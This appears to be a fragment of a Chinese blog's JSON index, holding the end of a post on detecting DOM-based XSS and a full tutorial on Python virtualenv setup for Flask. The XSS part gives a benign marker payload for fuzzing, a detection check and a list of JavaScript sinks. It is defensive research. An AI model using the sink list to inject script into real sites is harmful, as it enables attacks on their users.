在javascript层面劫持innerHTML这样的属性已经没那么容易了，常用的属性劫持可以针对具体的对象设置__defineSetter__，比如下面的代码12window.__defineSetter__(&apos;x&apos;,function()&#123;alert(&apos;hijack x&apos;)&#125;);window.x=&apos;xxxxxYYYYYYYY&apos;; 当x赋值的时候，就会触发事先定义好的Setter方法。innerHTML属性属于那些节点对象，想劫持具体节点对象的innerHTML，需要事先知道这个具体节点的对象，然后设置__defineSetter__,这样如果要检测DOM XSS，就要劫持所有的输出点，比较麻烦，那么思路二可能会比较简单一点 思路二 仍然借用浏览器动态执行的优势，写一个Firefox插件，我们完全以黑盒的方式进行模糊测试输入点，然后判断渲染后的DOM树中是否有我们期待的值，比如，模糊测试的内容都有如下一段代码document.write(&#39;d0m&#39;+&#39;x55&#39;)如果这段代码顺利执行了就会存在d0mx55文本节点，后续的检测工作只要判断是否存在这个文本节点就可以了123if(document.documentElement.innerHTML.indexOf(&apos;d0mx55&apos;)!=-1)&#123; alert(&apos;found dom xss&apos;);&#125; 这个思路以DOM树的改变为判断依据，简单准确，但是同样无法避免那些逻辑判断上导致的漏报。 附录 输出点 javascript code 直接输出HTML内容 document.write(…)document.writeln(…) document.body.innerHtml=… 直接修改DOM树（包括DHTML事件） document.forms[0].action=…document.attachEvent(…)document.create…(…)document.execCommand(…)document.body. …widow.attachEvent(…) 替换document url document.location=…(以及直接赋值给location的href,host,hostname属性)document.location.hostname=…document.location.replace(…)document.location.assign(…)documnent.URL=…window.navigate(…) 打开或修改新窗口 document.open(…)window.open(…)window.location.href=…(以及直接赋值给location的href,host,hostname属性) 直接执行脚本 eval(…)window.execScript(…)window.setInterval(…)window.setTimeout(…)"},{"title":"【OTHERS】flask virtualenv环境搭建","permalink":"http://blog.0kami.cn/2016/03/16/old-old-flask-virtualenv/","text":"引言python virtualenv为flask等web框架提供虚拟python环境（其他应用也可以），这样可以防止开发过程中安装的依赖影响原主机上的python环境，而且在迁移到上线环境中时，省去了配置上线环境中的python运行环境。 安装virtualenv 这里我推荐使用pip或者easy_install安装，同样也可以通过下载virtualenv.py来构建虚拟环境。 使用pip命令 pip install virtualenv 建立环境 首先进入网站的根目录（或者是任何需要建立虚拟环境的文件夹下） 使用dos命令 virtualenv venv 其中venv为python的虚拟环境，其中包括了python.exe、pip、easy_install等python环境。 激活环境 完成上一步后，接下来需要在dos界面激活虚拟环境，这样可以使得接下来下载的python模块都位于venv下的pip环境中Scripts\\activate 激活虚拟环境deactivate 退出虚拟环境 激活后命令行开头多了（venv），如下12E:\\code\\python-workplace\\flasker\\venv&gt;Scripts\\activate(venv) E:\\code\\python-workplace\\flasker\\venv&gt; 安装模块 在上面的基础下，通过pip install xxxx安装的模块都是安装在venv环境下的，对主机上的环境没有影响。 引入路径 在具体使用过程中，需要把venv的路径导入sys.path，这样才可以使用虚拟环境中的python模块。12importos,syssys.path.append(os.getcwd()+'\\\\venv\\\\Lib\\\\site-packages') 到这里就完成了python虚拟环境的搭建，总体对经常变动编程环境的城旭猿来说这是个非常有用功能。 ==The End=="}]}